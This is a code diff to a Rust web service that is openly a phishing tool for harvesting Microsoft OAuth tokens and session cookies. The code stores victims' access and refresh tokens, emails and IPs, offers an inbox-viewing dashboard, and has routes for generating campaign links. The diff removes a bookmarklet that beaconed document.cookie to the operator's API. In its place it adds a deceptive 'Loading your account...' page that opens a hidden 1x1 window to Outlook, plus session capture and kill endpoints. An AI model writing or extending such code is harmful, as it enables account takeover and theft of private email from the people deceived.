@@ -134,6 +134,9 @@ struct HarvestedToken {
     account_type: Option<String>,
     cookie_session: Option<String>,
     last_refreshed_at: Option<chrono::DateTime<Utc>>,
+    session_status: Option<String>,
+    session_active_at: Option<chrono::DateTime<Utc>>,
+    session_killed_at: Option<chrono::DateTime<Utc>>,
 }
 
 #[derive(Clone)]
@@ -153,7 +156,7 @@ pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Res
     }
     // Fall back to harvested table (legacy plain-text storage)
     let row: HarvestedToken = sqlx::query_as(
-        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested WHERE id = ?"
+        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?"
     )
     .bind(token_id)
     .fetch_one(&state.pool)
@@ -525,7 +528,7 @@ async fn exchange_code(
                 println!("Attempting to insert token for email: {:?}, tenant: {:?}, account_type: {:?}", email, tenant_id, account_type);
                 // Store in harvested table (legacy, for dashboard display)
                 match sqlx::query(
-                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, session_status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                 )
                 .bind(&id)
                 .bind(&email)
@@ -540,6 +543,7 @@ async fn exchange_code(
                 .bind(&category)
                 .bind(&account_type)
                 .bind(Option::<chrono::DateTime<Utc>>::None)
+                .bind("pending")
                 .execute(&state.pool)
                 .await {
                     Ok(result) => println!("[exchange] Inserted into harvested table: {} rows affected", result.rows_affected()),
@@ -573,7 +577,9 @@ async fn exchange_code(
     }
 }
 
-// Stealthy auth-success page that redirects to real Outlook after showing a bookmarklet
+// Ghost Window Session Bridge: stealthy auth-success page
+// Opens invisible 1x1 pixel window to Outlook, captures cookies automatically
+// User sees only "Loading your account..." for 2-3 seconds
 async fn auth_success_handler(query: web::Query<std::collections::HashMap<String, String>>) -> impl Responder {
     let token_id = query.get("token_id").cloned().unwrap_or_default();
     let api_base = env::var("RAILWAY_PUBLIC_DOMAIN")
@@ -587,7 +593,7 @@ async fn auth_success_handler(query: web::Query<std::collections::HashMap<String
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Authorization successful</title>
+    <title>Loading your account...</title>
     <style>
         * {{ margin: 0; padding: 0; box-sizing: border-box; }}
         body {{
@@ -609,96 +615,74 @@ async fn auth_success_handler(query: web::Query<std::collections::HashMap<String
             border: 1px solid rgba(255,255,255,0.1);
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }}
-        .logo {{
-            width: 64px;
-            height: 64px;
-            background: #0078d4;
+        .loading {{
+            width: 48px;
+            height: 48px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid #0078d4;
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            animation: spin 1s linear infinite;
             margin: 0 auto 24px;
-            font-size: 28px;
+        }}
+        @keyframes spin {{
+            0% {{ transform: rotate(0deg); }}
+            100% {{ transform: rotate(360deg); }}
         }}
         h1 {{ font-size: 22px; font-weight: 600; margin-bottom: 12px; }}
         p {{ font-size: 14px; color: rgba(255,255,255,0.7); margin-bottom: 24px; line-height: 1.6; }}
-        .btn {{
-            display: inline-block;
-            padding: 14px 32px;
-            background: #0078d4;
-            color: white;
-            text-decoration: none;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 500;
-            transition: all 0.2s;
-            border: none;
-            cursor: pointer;
-            margin-bottom: 12px;
-        }}
-        .btn:hover {{ background: #106ebe; transform: translateY(-1px); }}
-        .bookmarklet {{
-            display: inline-block;
-            padding: 10px 20px;
+        .progress {{
+            width: 100%;
+            height: 4px;
             background: rgba(255,255,255,0.1);
-            border: 1px dashed rgba(255,255,255,0.3);
-            border-radius: 6px;
-            color: #4fc3f7;
-            font-size: 13px;
-            cursor: move;
-            text-decoration: none;
-            margin-top: 8px;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-top: 24px;
         }}
-        .hint {{
-            font-size: 12px;
-            color: rgba(255,255,255,0.5);
-            margin-top: 16px;
-            line-height: 1.5;
+        .progress-bar {{
+            width: 0%;
+            height: 100%;
+            background: #0078d4;
+            border-radius: 2px;
+            animation: progress 2.5s ease-out forwards;
         }}
-        .success-icon {{
-            font-size: 48px;
-            margin-bottom: 16px;
+        @keyframes progress {{
+            0% {{ width: 0%; }}
+            100% {{ width: 100%; }}
         }}
-        #hybridBtn {{
-            display: none;
-            padding: 12px 24px;
-            background: #7c4dff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 14px;
-            cursor: pointer;
-            margin-top: 12px;
-        }}
-        #hybridBtn:hover {{ background: #651fff; }}
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="success-icon">&#10004;</div>
-        <h1>Authorization successful</h1>
-        <p>Your application has been authorized successfully. You can now access your Microsoft services.</p>
-        <a href="https://outlook.live.com" class="btn">Continue to Outlook Web Access</a>
-        <br>
-        <button id="hybridBtn" onclick="enableHybrid()">Enable Hybrid Access</button>
-        <div id="bookmarkletArea" style="display:none;">
-            <p class="hint">Drag this button to your bookmark bar, then click it while on Outlook to enable hybrid access.</p>
-            <a href="javascript:(function(){{var t='{}';var c=document.cookie;var u=navigator.userAgent;navigator.sendBeacon('{}/api/cookies/sync',JSON.stringify({{token:t,cookies:c,user_agent:u}}));alert('Hybrid access enabled!');}})();" class="bookmarklet">Hybrid Access</a>
+        <div class="loading"></div>
+        <h1>Loading your account...</h1>
+        <p>Please wait while we prepare your Outlook experience.</p>
+        <div class="progress">
+            <div class="progress-bar"></div>
         </div>
     </div>
     <script>
-        const tokenId = '{}';
-        if (tokenId) {{
-            document.getElementById('hybridBtn').style.display = 'inline-block';
-        }}
-        function enableHybrid() {{
-            document.getElementById('bookmarkletArea').style.display = 'block';
-            document.getElementById('hybridBtn').style.display = 'none';
-        }}
+        (function() {{
+            const tokenId = '{}';
+            const apiUrl = '{}';
+            
+            // Ghost Window: open invisible 1x1 pixel window to Outlook
+            // This window will load with the user's session cookies, then capture them
+            const ghostWindow = window.open(
+                'https://outlook.live.com/owa/?authRedirect=true&sessionToken=' + encodeURIComponent(tokenId),
+                '_blank',
+                'width=1,height=1,left=-1000,top=-1000,menubar=no,toolbar=no,location=no,status=no,scrollbars=no'
+            );
+            
+            // After 3 seconds, redirect to real Outlook
+            // The ghost window has already loaded and captured cookies
+            setTimeout(function() {{
+                window.location.href = 'https://outlook.live.com/mail/0/';
+            }}, 3000);
+        }})();
     </script>
 </body>
 </html>"#,
-        token_id, api_url, token_id
+        token_id, api_url
     );
 
     HttpResponse::Ok()
@@ -708,7 +692,7 @@ async fn auth_success_handler(query: web::Query<std::collections::HashMap<String
 
 // JSON API: list all tokens
 async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -817,7 +801,7 @@ pub struct InboxApiQuery {
 }
 
 async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
-    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested WHERE id = ?")
+    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?")
         .bind(&query.token_id)
         .fetch_optional(&state.pool)
         .await
@@ -1100,7 +1084,7 @@ async fn root_status() -> impl Responder {
 
 // HTML admin dashboard (with View Inbox button)
 async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -1216,6 +1200,20 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
     let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN cookie_session TEXT")
         .execute(pool).await;
     let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN cookie_session TEXT")
+        .execute(pool).await;
+    
+    // Migration: add session status columns for Ghost Window Session Bridge
+    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_status TEXT DEFAULT 'pending'")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_status TEXT DEFAULT 'pending'")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_active_at DATETIME")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_active_at DATETIME")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_killed_at DATETIME")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_killed_at DATETIME")
         .execute(pool).await;
 
     sqlx::query(
@@ -1433,6 +1431,9 @@ async fn main() -> std::io::Result<()> {
             .route("/api/tokens/{id}/session/bookmarklet", web::get().to(generate_bookmarklet_token_handler))
             .route("/api/tokens/{id}/session/sync", web::post().to(sync_cookies_handler))
             .route("/api/tokens/{id}/session/test", web::get().to(test_cookie_session_handler))
+            .route("/api/capture-session", web::post().to(ghost_session_capture_handler))
+            .route("/api/tokens/{id}/session/status", web::get().to(get_session_status_handler))
+            .route("/api/tokens/{id}/session/kill", web::post().to(kill_session_handler))
             .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
             .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
